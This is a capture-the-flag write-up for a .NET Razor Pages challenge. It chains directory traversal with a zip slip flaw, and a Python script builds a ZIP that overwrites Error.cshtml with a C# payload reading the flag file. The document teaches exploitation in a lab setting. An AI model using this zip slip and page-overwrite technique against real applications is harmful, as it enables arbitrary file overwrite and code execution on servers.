## Zippy

Opening the webapp we are greeted with a site seems to take zip files, unpack them, and allow users to view directories only. We can view the /**Browse** page and quickly find that input of `../` allows file path traversal, and we can see flag.txt contained a level above our .current directory.
However, we cannot view or trigger these files/pages. So the files are not available for download or viewing by URL. So we are likely limited to viewing certain web pages.We likely need to find an RCE exploit. But we can enumerate further and find that web pages are located in `../Pages`. But even more interesting is the fact we can access `../../root`. So this web app must have root privs already. Bad idea.

Enumerating further will lead eventually to the /**About** and /**Log** pages. Now at first there is not much in Logs, but the About section states something interesting:
#### Application Info
- Version: 1.0.0
- Framework: .NET 6.0
- Powered by Razor Pages | **Now with runtime compilation!**

**Razor Pages**. Interesting, we did find out the web pages are .cshtml. A quick search online and I quickly found a helpful [resource](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/). It appears that Razor Pages are vulnerable to simple C# injection. But where to inject? We do not have a text box to input a payload. So let's keep looking around.

Let us try to see what happens if we upload a zip on **/Upload** (asdf for ID and Name)
`File uploaded successfully to /app/wwwroot/uploads/asdf for account asdf (ID: asdf)`
Good to know. Let's check the logs. *Snipped the timestamps.*
```
Saving uploaded file to /app/wwwroot/uploads/asdf              
Saving uploaded ZIP file to /app/wwwroot/uploads/asdf/test.zip              
Extracting ZIP file /app/wwwroot/uploads/asdf/test.zip without path traversal checks.              
Extracting file to /app/wwwroot/uploads/asdf/test.txt
```
***WITHOUT*** traversal checks eh? Well with the LFI we found and the name Zippy, we can try to do a zip slip exploit with a payload in C# like we saw in that PoC, tailored to our needs. Honestly can probably revshell, but instead of portfwding and all that, why not try to view it on the app itself? After checking the full path with the /**Browse** page, it appears the web pages themselves are .cshtml files located in `/app/Pages` and we can see familiar ones like About/Browse/Upload/Error/etc. We can certainly access these.

We now have a plan. 
1. Zip slip a Razor Page payload in C#
2. Force app to unzip injected cshtml in specific location
3. I decided to try and replace Error.cshtml as it would not affect other functions we are using. 
4. All of this together explains the script I made, which generates the necessary zip slip files with our payload, then extracts our malicious page where Error is located, replacing it with our own version.
So lets read the flag.txt, and put it on the mf web page. EZ.
```python
import zipfile

zip_filename = 'smolW33n3r.zip'
gl0ryh0le = '../../../../app/Pages/Error.cshtml' # An accessible web page is replaced with ours

gh0st_l0ad = '''
@page
@{
    // Reads flag.txt
    var flagContent = System.IO.File.ReadAllText("/app/flag.txt");
}
<center>
<h1>smol indeed</h1>
<p>@flagContent</p>
</center>
'''
# ur load goes in the hole
with zipfile.ZipFile(zip_filename, 'w') as zipf:
    zipf.writestr(gl0ryh0le, gh0st_l0ad)

print(f"Created {zip_filename} successfully.")
```
Upload the generated zip. Then check the logs:
```powershell
Saving uploaded file to /app/wwwroot/uploads/asdf
Saving uploaded ZIP file to /app/wwwroot/uploads/asdf/smolW33n3r.zip
Extracting ZIP file /app/wwwroot/uploads/asdf/smolW33n3r.zip without path traversal checks.
Extracting file to /app/Pages/Error.cshtml
```
Well now **THAT** is looking good. Let's now try to access /**Error**:

**smol indeed**
`flag{a074eb7973c4c718790baefc096654dd}`
